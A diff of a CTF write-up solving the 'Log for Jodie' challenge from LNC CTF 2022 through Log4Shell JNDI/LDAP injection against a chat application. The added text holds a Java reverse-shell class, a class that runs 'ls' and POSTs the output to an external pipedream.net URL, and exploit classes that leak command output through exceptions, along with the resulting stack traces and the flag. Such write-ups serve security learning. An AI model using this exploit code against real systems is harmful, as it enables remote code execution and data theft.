@@ -4,7 +4,7 @@ Hi there!
 Here is how I've solved the "Log for Jodie" challenge in LNC CTF 2022.
 
 # WARNING
-This writeup is for EDUCATIONAL PURPOSES only. I do not have any responsibility if you face any legal consequences arising from the usage of this PoC.
+This writeup is for EDUCATIONAL PURPOSES only. I do not bear any responsibility if you face any legal consequences arising from the usage of this PoC.
 
 ## Challenge description
 
@@ -70,7 +70,7 @@ Follow Steps 1 and 2.
 For step 3, we need to specify the ports. The web server where exploit class is located is at port 8000, while JNDI/LDAP server is at 1389. For the JNDI/LDAP server, after some testing, I found that we cannot use HTTP. We need to use TCP.  
 
 To open multiple ports at once, you can do this:
-
+From: https://stackoverflow.com/questions/25522360/ngrok-configure-multiple-port-in-same-domain  
 Edit `~/.ngrok2/ngrok.yml` and put:
 ```
 authtoken: <YOUR AUTH TOKEN HERE>
@@ -95,20 +95,276 @@ When we paste that in, head to the Python poc.py and you will see something like
 Send LDAP reference result for a redirecting to http://localhost:8000/Exploit.class
 ```
 
-The localhost servers are already ported, but as you can see, the chat application is still on localhost.
+The localhost servers are already ported, but as you can see, the chat application is still being redirected to localhost.
 Upon inspection of `poc.py`, we see that this line is responsible:
 
  
- ​  `  ​url​ ​=​ ​"http://{}:{}/#Exploit"​.​format​(​userip​, ​lport​)`
+ ​  `  ​url​ ​=​ ​"http://{}:{}/#Exploit"​.​format​(​userip​, ​lport​)`  
 So we can change that yo our Web server url (the one running 8000 on local host.)
  
- ​   ` ​url​ ​=​ ​"http://{}/#Exploit"​.​format​(​"<WEB SERVER URL HERE>")`
+    ` url ="http://{}/#Exploit".format("<WEB SERVER URL HERE>")`
 
 Upon further inspection,  we also realise that the Java exploit program is enclosed in multiline quotes `"""` as `program`
 We can modify this to our liking. 
+Original code (you should get this from the GitHub PoC):
+```python
+program = """
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+public class Exploit {
+    public Exploit() throws Exception {
+        String host="%s";
+        int port=%d;
+        String cmd="/bin/sh";
+        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s=new Socket(host,port);
+        InputStream pi=p.getInputStream(),
+            pe=p.getErrorStream(),
+            si=s.getInputStream();
+        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+        while(!s.isClosed()) {
+            while(pi.available()>0)
+                so.write(pi.read());
+            while(pe.available()>0)
+                so.write(pe.read());
+            while(si.available()>0)
+                po.write(si.read());
+            so.flush();
+            po.flush();
+            Thread.sleep(50);
+            try {
+                p.exitValue();
+                break;
+            }
+            catch (Exception e){
+            }
+        };
+        p.destroy();
+        s.close();
+    }
+}
+""" % (userip, lport)
+```
 
-When we type in the JNDI/LDAP uri into the chat app, we get an exception. (Don't have it now, will post later, watch repo for update)
-I have tested with Java code uploading HTTP GET and POST requests using the Java Standard Library, and it turns out we cannot connect to the Internet from Java (the machine is buggy? 🤔)
-However, a very detailed stack trace is printed. We can throw an exception to get output from commands.
+When we type in the JNDI/LDAP uri into the chat app, we get an exception.  
+![Screenshot from 2022-03-25 19-52-53](https://user-images.githubusercontent.com/58442255/160116092-7c0571f1-15ce-4f4e-b6a1-e6482c57fafc.png)
 
-Will post the rest soon. Watch repo for updates.
+ 
+<details>
+  <summary>Java HTTP connection code (does not work on remote coffee chat app) (not very important)</summary>
+I have tested with Java code uploading HTTP GET and POST requests using the Java Standard Library, and it turns out we cannot connect to the Internet from Java (the machine is buggy? 🤔), so we cannot send information through GET or POST requests.  
+Here's my code if you'd like to take a look: 
+  
+```  
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.StringJoiner;
+
+
+public class Exploit {
+    public Exploit() throws Exception {
+        URL url = new URL("https://enypztvgk53ep.x.pipedream.net/");
+        HttpURLConnection con = (HttpURLConnection)url.openConnection();
+
+        con.setRequestMethod("POST");
+        con.setRequestProperty("Content-Type", "application/json; utf-8");
+        con.setRequestProperty("Accept", "application/json");
+        con.setDoOutput(true);
+
+        Process p = Runtime.getRuntime().exec("ls");
+        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        StringBuilder line2 = new StringBuilder();
+
+        while ((line = br.readLine()) != null) {
+            line2.append(line);
+            line2.append(",");
+        }
+        Map<String,String> arguments = new HashMap<>();
+        arguments.put("username", "root");
+        arguments.put("list", line2.toString()); 
+        StringJoiner sj = new StringJoiner("&");
+        for(Map.Entry<String,String> entry : arguments.entrySet())
+            sj.add(URLEncoder.encode(entry.getKey(), "UTF-8") + "="
+                    + URLEncoder.encode(entry.getValue(), "UTF-8"));
+        byte[] out = sj.toString().getBytes(StandardCharsets.UTF_8);
+        int length = out.length;
+
+        con.setFixedLengthStreamingMode(length);
+        con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+        con.connect();
+        try(OutputStream os = con.getOutputStream()) {
+            os.write(out);
+            System.out.println(con.getResponseCode());
+        }
+}
+  
+```  
+This causes:
+  
+  ```
+  Exception in thread "main" java.lang.ExceptionInInitializerError
+...........
+Caused by: java.security.ProviderException: Could not initialize NSS
+	......
+Caused by: java.io.FileNotFoundException: /usr/lib/libnss3.so
+	at sun.security.pkcs11.Secmod.initialize(Secmod.java:193)
+	at sun.security.pkcs11.SunPKCS11.<init>(SunPKCS11.java:218)
+	... 78 more
+  ```
+  Clearly the server does not support sending the request.
+
+
+</details>
+However, a very detailed stack trace is printed. We can throw an exception to get output from commands.  
+Here is my final crafted exploit program:  
+  
+**Note:** We must disconnect the python program and connect again (Ctrl+c)
+  (the one started with  `python3 poc.py --userip localhost --webport 8000 --lport 9001` )
+  
+```python
+  program = """
+
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.StringJoiner;
+
+
+public class Exploit {
+    public Exploit() throws Exception {
+
+        Process p = Runtime.getRuntime().exec("ls");
+        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        StringBuilder line2 = new StringBuilder();
+
+        while ((line = br.readLine()) != null) {
+            line2.append(line);
+            line2.append(",");
+        }
+
+        throw new Exception(line2.toString());
+    }}
+"""
+```
+  
+This throws an exception with the output from `ls`.
+  
+We get this exception:
+
+```java
+  java.lang.Exception: bin,dev,etc,home,lib,media,mnt,proc,root,run,sbin,srv,sys,task,tmp,usr,var,]; remaining name 'a'
+	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1120)
+	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
+.................................lines truncated.....................
+
+```
+  
+  We can see that there is a directory named `task`, which seems like a good place for the flag to be hidden(task is not a default Linux directory)
+  
+  ```python
+  program = """
+
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.StringJoiner;
+
+
+public class Exploit {
+    public Exploit() throws Exception {
+
+        Process p = Runtime.getRuntime().exec("ls task");
+        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        StringBuilder line2 = new StringBuilder();
+
+        while ((line = br.readLine()) != null) {
+            line2.append(line);
+            line2.append(",");
+        }
+
+        throw new Exception(line2.toString());
+    }}
+"""
+```
+  
+  
+  Again:
+  **Note:** We must disconnect the python program and connect again (Ctrl+c)
+  (the one started with  `python3 poc.py --userip localhost --webport 8000 --lport 9001` )
+ 
+  We see this exception
+  ```java
+  Exception: chall.jar,flag.txt,]; remaining name 'a'
+	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1120)
+	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
+	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
+	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
+	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
+	at javax.naming.InitialContext.lookup(InitialContext.java:417)
+	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
+	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:
+  .........
+  ```
+  There's a flag.txt inside.
+  
+  Let's change 
+ `Process p = Runtime.getRuntime().exec("ls task");`
+
+  to
+  `Process p = Runtime.getRuntime().exec("cat task/flag.txt");`
+  
+   Again:
+  **Note:** We must disconnect the python program and connect again (Ctrl+c)
+  (the one started with  `python3 poc.py --userip localhost --webport 8000 --lport 9001` )
+  
+  
+  We got the flag!
+  
+  ```
+  Exception: LNC2022{b94ec2015978e809b02a6a011970ada8},]; remaining name 'a'
+	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1120)
+	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
+	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
+	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
+	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
+	at javax.naming.InitialContext.lookup(InitialContext.java:417)
+	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
+	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
+	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:223)
+	at org.apache.logging.log4j.core.
+  ```
+  
+  Flag:
+  ```
+   LNC2022{b94ec2015978e809b02a6a011970ada8}
+  ```
